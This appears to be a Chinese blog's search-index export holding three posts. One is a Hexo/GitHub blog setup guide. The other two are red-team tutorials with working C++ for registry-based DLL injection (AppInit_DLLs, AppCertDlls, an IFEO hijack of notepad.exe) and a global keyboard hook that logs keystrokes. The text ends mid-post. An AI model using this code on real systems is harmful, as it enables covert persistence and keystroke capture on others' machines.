[{"title":"hexo+github搭建博客","url":"/Hexo+github%20Build%20Blog/","content":"<p>使用Hexo配合NEXT主题搭建个人主页，再上传到Github repository中来对外发布。</p>\n<span id=\"more\"></span>\n\n\n\n<h2 id=\"0x01-安装环境\"><a href=\"#0x01-安装环境\" class=\"headerlink\" title=\"0x01 安装环境\"></a>0x01 安装环境</h2><p>我这里使用的是Ubuntu20.04</p>\n<h3 id=\"Ubuntu安装nodejs\"><a href=\"#Ubuntu安装nodejs\" class=\"headerlink\" title=\"Ubuntu安装nodejs\"></a>Ubuntu安装nodejs</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo apt update</span><br><span class=\"line\">sudo apt install nodejs</span><br><span class=\"line\">sudo apt install npm</span><br><span class=\"line\">node --version</span><br><span class=\"line\">npm --version</span><br></pre></td></tr></table></figure>\n\n<p>nodejs的版本低于12就会报错，需要升级nodejs，安装一个node版本切换工具 n</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo npm install -g n</span><br><span class=\"line\">sudo n stable</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"0x02-安装Hexo\"><a href=\"#0x02-安装Hexo\" class=\"headerlink\" title=\"0x02 安装Hexo\"></a>0x02 安装Hexo</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo npm install -g hexo-cli</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Hexo创建博客\"><a href=\"#Hexo创建博客\" class=\"headerlink\" title=\"Hexo创建博客\"></a>Hexo创建博客</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">mkdir blog</span><br><span class=\"line\"><span class=\"built_in\">cd</span> blog</span><br><span class=\"line\">hexo init <span class=\"comment\"># 初始化创建博客文件</span></span><br><span class=\"line\">hexo clean <span class=\"comment\"># 清除生成的发布目录</span></span><br><span class=\"line\">hexo generate <span class=\"comment\"># 生成发布目录</span></span><br><span class=\"line\">hexo server <span class=\"comment\"># 开启本地服务</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"0x03-安装NEXT主题\"><a href=\"#0x03-安装NEXT主题\" class=\"headerlink\" title=\"0x03 安装NEXT主题\"></a>0x03 安装NEXT主题</h2><p>在Github项目中<a href=\"https://github.com/theme-next/hexo-theme-next\">NEXT主题</a>是有theme-next来维护的</p>\n<p>在博客根目录下直接用git下载：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> blog</span><br><span class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/theme-next/hexo-theme-next themes/next</span><br></pre></td></tr></table></figure>\n\n<p>此时在 Hexo 中有两份主要的配置文件，其名称都是 <code>_config.yml</code>。      其中，一份位于站点根目录下，主要包含 Hexo 本身的配置；另一份位于主题目录下，这份配置由主题作者提供，主要用于配置主题相关的选项。在以下说明中，将前者称为<code>站点配置文件</code>，后者称为<code>主题配置文件</code>。    </p>\n<p>打开<code>站点配置文件</code>，找到theme字段，将其改为next：</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">theme:</span> <span class=\"string\">next</span></span><br></pre></td></tr></table></figure>\n\n<p>NexT 主题安装完成，启用前使用<code>hexo clean</code> 来清除 Hexo 的缓存，再使用<code>Hexo generate</code>重新生成缓存。</p>\n<h2 id=\"0x04-Gihub发布\"><a href=\"#0x04-Gihub发布\" class=\"headerlink\" title=\"0x04 Gihub发布\"></a>0x04 Gihub发布</h2><h3 id=\"1-Github创建仓库\"><a href=\"#1-Github创建仓库\" class=\"headerlink\" title=\"1 Github创建仓库\"></a>1 Github创建仓库</h3><p>需要创建一个仓库命名为$username.github.io</p>\n<h3 id=\"2-生成Github-Token\"><a href=\"#2-生成Github-Token\" class=\"headerlink\" title=\"2 生成Github Token\"></a>2 生成Github Token</h3><p>在Github的<code>Settings/Developer settings/Personal access tokens</code>中点击右侧的<code>Generate new taken</code>按钮，注意下面还有勾选token的权限范围</p>\n<p><img src=\"1.png\"></p>\n<p>点击下方的<code>Generate token</code>按钮</p>\n<p><img src=\"2.png\"></p>\n<p>token只会显示一次，所以最好将token保存在本地</p>\n<h3 id=\"3-部署网站\"><a href=\"#3-部署网站\" class=\"headerlink\" title=\"3 部署网站\"></a>3 部署网站</h3><p>首先需要修改<code>站点配置文件</code>：</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># Deployment</span></span><br><span class=\"line\"><span class=\"comment\">## Docs: https://hexo.io/docs/one-command-deployment</span></span><br><span class=\"line\"><span class=\"attr\">deploy:</span></span><br><span class=\"line\">  <span class=\"attr\">type:</span> <span class=\"string\">git</span></span><br><span class=\"line\">  <span class=\"attr\">repository:</span> <span class=\"string\">https://token@github.com/username/username.github.io.git</span></span><br><span class=\"line\">  <span class=\"attr\">branch:</span> <span class=\"string\">main</span></span><br></pre></td></tr></table></figure>\n\n<p>Hexo安装Git部署插件：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure>\n\n<p>设置git信息</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global user.name <span class=\"string\">&quot;Your Name&quot;</span></span><br><span class=\"line\">git config --global user.email <span class=\"string\">&quot;you@example.com&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>开始部署：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">hexo clean </span><br><span class=\"line\">hexo g </span><br><span class=\"line\">hexo d</span><br></pre></td></tr></table></figure>","categories":["Util"],"tags":["Web"]},{"title":"Windows进程注入方法-注册表注入","url":"/RegistryInjection/","content":"<h1 id=\"Windows注册表注入\"><a href=\"#Windows注册表注入\" class=\"headerlink\" title=\"Windows注册表注入\"></a>Windows注册表注入</h1><h2 id=\"0x1-介绍\"><a href=\"#0x1-介绍\" class=\"headerlink\" title=\"0x1 介绍\"></a>0x1 介绍</h2><p>windows整个系统的配置都保存在这个注册表中，有以下位置可以用来进行dll注入：</p>\n<ul>\n<li><code>AppInit_DLLs</code></li>\n<li><code>AppCertDlls</code></li>\n<li><code>image file execution options</code></li>\n</ul>\n<span id=\"more\"></span>\n\n<h2 id=\"0x2-AppInit-DLLs\"><a href=\"#0x2-AppInit-DLLs\" class=\"headerlink\" title=\"0x2 AppInit_DLLs\"></a>0x2 AppInit_DLLs</h2><h3 id=\"1-原理\"><a href=\"#1-原理\" class=\"headerlink\" title=\"1. 原理\"></a>1. 原理</h3><p>注册表位置：</p>\n<blockquote>\n<p>64 bit: HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows</p>\n<p>32 bit: HKEY_LOCAL_MACHINE\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Windows</p>\n</blockquote>\n<p>当User32.dll被映射到一个新的进程时，会收到<code>DLL_PROCESS_ATTACH</code>通知，就会取得上述注册表键的值，并调用<code>LoadLibary</code>来载入这个字符串中指定的每个DLL。</p>\n<p>DLL只会被映射到那些使用了<code>user32.dll</code>的进程中，所有基于GUI的应用程序都使用了<code>user32.dll</code>，但大多数基于CUI的应用程序都不会使用它。</p>\n<h3 id=\"2-步骤\"><a href=\"#2-步骤\" class=\"headerlink\" title=\"2. 步骤\"></a>2. 步骤</h3><p>有两个键值需要修改：</p>\n<ul>\n<li><code>AppInit_DLLs</code>：指定一个dll路径或系统路径下的dll名称</li>\n<li><code>LoadAppInit_DLLs</code>：设置为1时注入才会起效</li>\n</ul>\n<h3 id=\"3-代码\"><a href=\"#3-代码\" class=\"headerlink\" title=\"3. 代码\"></a>3. 代码</h3><figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">AppInit_DLLsInject</span><span class=\"params\">()</span> </span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    HKEY hKey;</span><br><span class=\"line\">    DWORD dwData;</span><br><span class=\"line\">    CHAR szDllPath[] = <span class=\"string\">&quot;C:\\\\Windows\\\\Temp\\\\TestDll.dll&quot;</span>;</span><br><span class=\"line\">    LONG lRet = <span class=\"number\">0</span>;</span><br><span class=\"line\">    DWORD dwValue = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    lRet = <span class=\"built_in\">RegOpenKeyEx</span>(</span><br><span class=\"line\">        HKEY_LOCAL_MACHINE,</span><br><span class=\"line\">        <span class=\"string\">&quot;SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Windows&quot;</span>,</span><br><span class=\"line\">        <span class=\"number\">0</span>, </span><br><span class=\"line\">        KEY_ALL_ACCESS,</span><br><span class=\"line\">        &amp;hKey</span><br><span class=\"line\">    );</span><br><span class=\"line\"></span><br><span class=\"line\">    lRet = <span class=\"built_in\">RegSetValueEx</span>(</span><br><span class=\"line\">        hKey,</span><br><span class=\"line\">        <span class=\"string\">&quot;AppInit_DLLs&quot;</span>,</span><br><span class=\"line\">        <span class=\"number\">0</span>,</span><br><span class=\"line\">        REG_SZ,</span><br><span class=\"line\">        (BYTE*)szDllPath,</span><br><span class=\"line\">        <span class=\"built_in\">lstrlen</span>(szDllPath) + <span class=\"number\">1</span></span><br><span class=\"line\">    );</span><br><span class=\"line\"></span><br><span class=\"line\">    dwValue = <span class=\"number\">1</span>;</span><br><span class=\"line\">    lRet = <span class=\"built_in\">RegSetValueEx</span>(</span><br><span class=\"line\">        hKey,</span><br><span class=\"line\">        <span class=\"string\">&quot;LoadAppInit_DLLs&quot;</span>,</span><br><span class=\"line\">        <span class=\"number\">0</span>,</span><br><span class=\"line\">        REG_DWORD,</span><br><span class=\"line\">        (BYTE*)&amp;dwValue,</span><br><span class=\"line\">        <span class=\"built_in\"><span class=\"keyword\">sizeof</span></span>(dwValue)</span><br><span class=\"line\">    );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">RegCloseKey</span>(hKey);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"0x3-AppCertDlls\"><a href=\"#0x3-AppCertDlls\" class=\"headerlink\" title=\"0x3 AppCertDlls\"></a>0x3 AppCertDlls</h2><h3 id=\"1-原理-1\"><a href=\"#1-原理-1\" class=\"headerlink\" title=\"1. 原理\"></a>1. 原理</h3><p>注册表位置：</p>\n<blockquote>\n<p>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager</p>\n</blockquote>\n<p>此注册表项下的DLL被加载到调用<code>Win32 API</code>函数<code>CreateProcess</code>，<code>CreateProcessAsUser</code>，<code>CreateProcessWithLogonW</code>，<code>CreateProcessWithTokenW</code>和<code>WinExec</code>的每个进程中。</p>\n<h3 id=\"2-步骤-1\"><a href=\"#2-步骤-1\" class=\"headerlink\" title=\"2. 步骤\"></a>2. 步骤</h3><p>现在该位置创建一个子项<code>AppCertDlls</code>，然后在该子项中创建一对键值，将值设置为要注入dll的路径</p>\n<h3 id=\"3-代码-1\"><a href=\"#3-代码-1\" class=\"headerlink\" title=\"3. 代码\"></a>3. 代码</h3><figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">AppCertDllsInject</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    HKEY hKey;</span><br><span class=\"line\">    DWORD dwData;</span><br><span class=\"line\">    CHAR szDllPath[] = <span class=\"string\">&quot;C:\\\\Windows\\\\Temp\\\\TestDll.dll&quot;</span>;</span><br><span class=\"line\">    LONG lRet = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    lRet = <span class=\"built_in\">RegCreateKeyEx</span>(</span><br><span class=\"line\">        HKEY_LOCAL_MACHINE,</span><br><span class=\"line\">        <span class=\"string\">&quot;SYSTEM\\\\CurrentControlSet\\\\Control\\\\Session Manager\\\\AppCertDlls&quot;</span>,</span><br><span class=\"line\">        <span class=\"number\">0</span>,</span><br><span class=\"line\">        <span class=\"literal\">NULL</span>,</span><br><span class=\"line\">        <span class=\"number\">0</span>,</span><br><span class=\"line\">        KEY_ALL_ACCESS,</span><br><span class=\"line\">        <span class=\"literal\">NULL</span>,</span><br><span class=\"line\">        &amp;hKey,</span><br><span class=\"line\">        <span class=\"literal\">NULL</span></span><br><span class=\"line\">    );</span><br><span class=\"line\"></span><br><span class=\"line\">    lRet = <span class=\"built_in\">RegSetValueEx</span>(</span><br><span class=\"line\">        hKey,</span><br><span class=\"line\">        <span class=\"string\">&quot;Default&quot;</span>,</span><br><span class=\"line\">        <span class=\"number\">0</span>,</span><br><span class=\"line\">        REG_SZ,</span><br><span class=\"line\">        (BYTE*)szDllPath,</span><br><span class=\"line\">        <span class=\"built_in\">lstrlen</span>(szDllPath) + <span class=\"number\">1</span></span><br><span class=\"line\">    );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">RegCloseKey</span>(hKey);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"0x4-Image-Hijack（映像文件执行选项（IFEO））\"><a href=\"#0x4-Image-Hijack（映像文件执行选项（IFEO））\" class=\"headerlink\" title=\"0x4 Image Hijack（映像文件执行选项（IFEO））\"></a>0x4 Image Hijack（映像文件执行选项（IFEO））</h2><h3 id=\"1-原理-2\"><a href=\"#1-原理-2\" class=\"headerlink\" title=\"1. 原理\"></a>1. 原理</h3><p>注册表位置：</p>\n<blockquote>\n<p>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options</p>\n</blockquote>\n<p><code>IFEO</code>通常用于调试目的。开发人员可以在此注册表项下设置<code>调试器值</code>，以将程序附加到另一个可执行文件以进行调试。</p>\n<p>就是原程序的启动命令行作为参数传递给了调试器，例如<code>notepad.exe</code> ==&gt; <code>cmd.exe notepad.exe</code></p>\n<h3 id=\"2-步骤-2\"><a href=\"#2-步骤-2\" class=\"headerlink\" title=\"2. 步骤\"></a>2. 步骤</h3><ul>\n<li>创建一个子项，名称就是目标程序名称，例如<code>notepad.exe</code></li>\n<li>在该子项中创建一对键值，键名为<code>debugger</code>，值设置为调试器程序路径</li>\n</ul>\n<h3 id=\"3-代码-2\"><a href=\"#3-代码-2\" class=\"headerlink\" title=\"3. 代码\"></a>3. 代码</h3><figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">ImageHijackInject</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    HKEY hKey;</span><br><span class=\"line\">    DWORD dwData;</span><br><span class=\"line\">    CHAR szPath[] = <span class=\"string\">&quot;cmd.exe&quot;</span>;</span><br><span class=\"line\">    LONG lRet = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    lRet = <span class=\"built_in\">RegCreateKeyEx</span>(</span><br><span class=\"line\">        HKEY_LOCAL_MACHINE,</span><br><span class=\"line\">        <span class=\"string\">&quot;SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\notepad.exe&quot;</span>,</span><br><span class=\"line\">        <span class=\"number\">0</span>,</span><br><span class=\"line\">        <span class=\"literal\">NULL</span>,</span><br><span class=\"line\">        <span class=\"number\">0</span>,</span><br><span class=\"line\">        KEY_ALL_ACCESS,</span><br><span class=\"line\">        <span class=\"literal\">NULL</span>,</span><br><span class=\"line\">        &amp;hKey,</span><br><span class=\"line\">        <span class=\"literal\">NULL</span></span><br><span class=\"line\">    );</span><br><span class=\"line\"></span><br><span class=\"line\">    lRet = <span class=\"built_in\">RegSetValueEx</span>(</span><br><span class=\"line\">        hKey,</span><br><span class=\"line\">        <span class=\"string\">&quot;Debugger&quot;</span>,</span><br><span class=\"line\">        <span class=\"number\">0</span>,</span><br><span class=\"line\">        REG_SZ,</span><br><span class=\"line\">        (BYTE*)szPath,</span><br><span class=\"line\">        <span class=\"built_in\">lstrlen</span>(szPath) + <span class=\"number\">1</span></span><br><span class=\"line\">    );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">RegCloseKey</span>(hKey);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"参考链接\"><a href=\"#参考链接\" class=\"headerlink\" title=\"参考链接\"></a><em>参考链接</em></h1><blockquote>\n<p><a href=\"https://www.cnblogs.com/LittleHann/p/6336950.html\">https://www.cnblogs.com/LittleHann/p/6336950.html</a></p>\n</blockquote>\n","categories":["Security"],"tags":["windows","readteam"]},{"title":"Windows进程注入方法-Windows钩子注入","url":"/WindowsHookInjection/","content":"<h1 id=\"WindowsHookInjection\"><a href=\"#WindowsHookInjection\" class=\"headerlink\" title=\"WindowsHookInjection\"></a>WindowsHookInjection</h1><h1 id=\"0x1-介绍\"><a href=\"#0x1-介绍\" class=\"headerlink\" title=\"0x1 介绍\"></a>0x1 介绍</h1><p>钩子(Hook)，是Windows消息处理机制的一个平台，应用程序可以在上面设置子程以监视指定窗口的某种消息，而且所监视的窗口可以是其他进程所创建的。当消息到达后，在目标窗口处理函数之前处理该消息。</p>\n<span id=\"more\"></span>\n\n<p>因此，钩子机制允许应用程序截获处理window消息或特定事件。</p>\n<p>底层上看，钩子实际上是一个处理消息的程序段，通过系统调用，把它挂入系统。每当特定的消息发出，在没有到达目的窗口前，钩子程序就先捕获该消息，亦即钩子函数先得到控制权。这时钩子函数即可以加工处理（改变）该消息，也可以不作处理而继续传递该消息，还可以强制结束消息的传递。</p>\n<h1 id=\"0x2-原理\"><a href=\"#0x2-原理\" class=\"headerlink\" title=\"0x2 原理\"></a>0x2 原理</h1><p>核心是使用挂钩API：<code>SetWindowsHookEx</code>， 在微软的msdn上有详细介绍：</p>\n<blockquote>\n<h3 id=\"SetWindowsHookEx\"><a href=\"#SetWindowsHookEx\" class=\"headerlink\" title=\"SetWindowsHookEx\"></a>SetWindowsHookEx</h3><p>The <strong>SetWindowsHookEx</strong> function installs an application-defined hook  procedure into a hook chain. You would install a hook procedure to monitor the  system for certain types of events. These events are associated either with a  specific thread or with all threads in the same desktop as the calling thread. </p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">&gt;<span class=\"function\">HHOOK <span class=\"title\">SetWindowsHookEx</span><span class=\"params\">(</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">&gt;<span class=\"keyword\">int</span> idHook,        <span class=\"comment\">// hook type</span></span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">&gt;HOOKPROC lpfn,     <span class=\"comment\">// hook procedure</span></span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">&gt;HINSTANCE hMod,    <span class=\"comment\">// handle to application instance</span></span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">&gt;DWORD dwThreadId   <span class=\"comment\">// thread identifier);</span></span></span></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"Parameters\"><a href=\"#Parameters\" class=\"headerlink\" title=\"Parameters\"></a>Parameters</h4><ul>\n<li><em>idHook</em> </li>\n</ul>\n<p>[in] Specifies the type of hook procedure to be installed. This parameter  can be one of the following values. </p>\n<ul>\n<li><em>lpfn</em> </li>\n</ul>\n<p>[in] Pointer to the hook procedure. If the <em>dwThreadId</em> parameter is  zero or specifies the identifier of a thread created by a different process, the  <em>lpfn</em> parameter must point to a hook procedure in a dynamic-link library  (DLL). Otherwise, <em>lpfn</em> can point to a hook procedure in the code  associated with the current process. </p>\n<ul>\n<li><em>hMod</em> </li>\n</ul>\n<p>[in] Handle to the DLL containing the hook procedure pointed to by the  <em>lpfn</em> parameter. The <em>hMod</em> parameter must be set to NULL if the  <em>dwThreadId</em> parameter specifies a thread created by the current process  and if the hook procedure is within the code associated with the current  process. </p>\n<ul>\n<li><em>dwThreadId</em> </li>\n</ul>\n<p>[in] Specifies the identifier of the thread with which the hook procedure is  to be associated. If this parameter is zero, the hook procedure is associated  with all existing threads running in the same desktop as the calling thread. </p>\n</blockquote>\n<p>钩子分为局部钩子和全局钩子：</p>\n<ul>\n<li>局部钩子：hMod设为NULL，dwThreadId=本线程Id</li>\n<li>全局钩子：hMod为回调函数所在模块句柄</li>\n</ul>\n<p>如果需要对某进程注入，需要使用全局钩子，需要创建一个dll，hMod为dll的模块句柄，Hook的回调函数放在dll中，线程Id为指定进程的主线程Id，线程Id为0时则会钩系统范围内所有进程的窗口进程</p>\n<h1 id=\"0x3-代码\"><a href=\"#0x3-代码\" class=\"headerlink\" title=\"0x3 代码\"></a>0x3 代码</h1><p>exe部分：</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;windows.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">typedef</span> <span class=\"title\">LRESULT</span> <span class=\"params\">(CALLBACK *pHookFun)</span><span class=\"params\">(<span class=\"keyword\">int</span>, WPARAM, LPARAM)</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\">pHookFun HookKeyboardProc = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tHMODULE hMod = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\thMod = ::<span class=\"built_in\">LoadLibrary</span>(<span class=\"string\">&quot;HookDll.dll&quot;</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!hMod) &#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">OutputDebugString</span>(<span class=\"string\">&quot;[-] LoadLibrary(\\&quot;HookDll.dll\\&quot;) faild&quot;</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t::<span class=\"built_in\">OutputDebugString</span>(<span class=\"string\">&quot;[+] LoadLibrary(\\&quot;HookDll.dll\\&quot;) success&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\tHHOOK* g_pHook = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tg_pHook = (HHOOK*)::<span class=\"built_in\">GetProcAddress</span>(hMod, <span class=\"string\">&quot;g_hook&quot;</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!g_pHook) &#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">OutputDebugString</span>(<span class=\"string\">&quot;[-] GetProcAddress(hMod, \\&quot;g_hook\\&quot;) faild&quot;</span>);</span><br><span class=\"line\">\t\t<span class=\"built_in\">FreeLibrary</span>(hMod);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t::<span class=\"built_in\">OutputDebugString</span>(<span class=\"string\">&quot;[+] GetProcAddress(hMod, \\&quot;g_hook\\&quot;) success&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\tHookKeyboardProc = (pHookFun)::<span class=\"built_in\">GetProcAddress</span>(hMod, <span class=\"string\">&quot;HookKeyboardProc&quot;</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!HookKeyboardProc) &#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">OutputDebugString</span>(<span class=\"string\">&quot;[-] GetProcAddress(hMod, \\&quot;HookKeyboardProc\\&quot;) faild&quot;</span>);</span><br><span class=\"line\">\t\t<span class=\"built_in\">FreeLibrary</span>(hMod);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t::<span class=\"built_in\">OutputDebugString</span>(<span class=\"string\">&quot;[+] GetProcAddress(hMod, \\&quot;HookKeyboardProc\\&quot;) success&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t*g_pHook = ::<span class=\"built_in\">SetWindowsHookEx</span>(</span><br><span class=\"line\">\t\tWH_KEYBOARD,</span><br><span class=\"line\">\t\tHookKeyboardProc,</span><br><span class=\"line\">\t\thMod,</span><br><span class=\"line\">\t\t<span class=\"number\">0</span></span><br><span class=\"line\">\t);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!*g_pHook) </span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t::<span class=\"built_in\">OutputDebugString</span>(<span class=\"string\">&quot;[+] SetWindowsHookEx faild&quot;</span>);</span><br><span class=\"line\">\t\t<span class=\"built_in\">FreeLibrary</span>(hMod);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t::<span class=\"built_in\">OutputDebugString</span>(<span class=\"string\">&quot;[+] SetWindowsHookEx success&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;[+] Start hook keyboard message, wait for exit\\r\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">system</span>(<span class=\"string\">&quot;pause&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">UnhookWindowsHookEx</span>(*g_pHook);</span><br><span class=\"line\">\t::<span class=\"built_in\">OutputDebugString</span>(<span class=\"string\">&quot;[+] UnhookWindowsHookEx&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;[+] End hook keyboard message, exit\\r\\n&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>HookDll:</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\">HOOKDLL_API HHOOK g_hook = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\"><span class=\"function\">HOOKDLL_API LRESULT CALLBACK <span class=\"title\">HookKeyboardProc</span><span class=\"params\">(</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">    <span class=\"keyword\">int</span> code,       <span class=\"comment\">// hook code</span></span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">    WPARAM wParam,  <span class=\"comment\">// virtual-key code</span></span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">    LPARAM lParam   <span class=\"comment\">// keystroke-message information</span></span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (code &lt; <span class=\"number\">0</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"built_in\">CallNextHookEx</span>(</span><br><span class=\"line\">            g_hook,</span><br><span class=\"line\">            code,</span><br><span class=\"line\">            wParam,</span><br><span class=\"line\">            lParam);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">char</span> szBuff[MAXBYTE] = &#123; <span class=\"number\">0</span> &#125;;</span><br><span class=\"line\">    <span class=\"built_in\">wsprintf</span>(szBuff, <span class=\"string\">&quot;Hook：%c &quot;</span>, wParam);</span><br><span class=\"line\">    <span class=\"built_in\">OutputDebugString</span>(szBuff);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">CallNextHookEx</span>(</span><br><span class=\"line\">        g_hook,</span><br><span class=\"line\">        code,</span><br><span class=\"line\">        wParam,</span><br><span class=\"line\">        lParam);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"0x4-优缺点\"><a href=\"#0x4-优缺点\" class=\"headerlink\" title=\"0x4 优缺点\"></a>0x4 优缺点</h1><h2 id=\"1-优点\"><a href=\"#1-优点\" class=\"headerlink\" title=\"1. 优点\"></a>1. 优点</h2><ul>\n<li>和利用注册表来注入DLL的方法相比，这种方法允许我们在不需要该DLL的时候从进程的地址空间中撤销对它的映射，只需要调用UnhookWindowsHookEx就可以达到目的。当一个线程调用UnhookWindowsHookEx的时候，系统会遍历自己内部的一个已经注入过该DLL的进程列表，并将该DLL的锁计数器递减。当锁计数器减到0的时候，系统会自动从进程的地址空间中撤销对该DLL的映射</li>\n<li>这种方式可以理解为借用了windows自己原生的机制来进行DLL注入，注入过程比较稳定</li>\n<li>当系统把<strong>挂钩过滤函数（hook filter function）</strong>所对应的DLL注入或映射到地址空间中时，会映射整个DLL，而不仅仅只是挂钩过滤函数，这意味着该DLL内的所有函数存在于被注入的进程中，能够被被注入进程中的任何线程调用。</li>\n</ul>\n<h2 id=\"2-缺点\"><a href=\"#2-缺点\" class=\"headerlink\" title=\"2. 缺点\"></a>2. 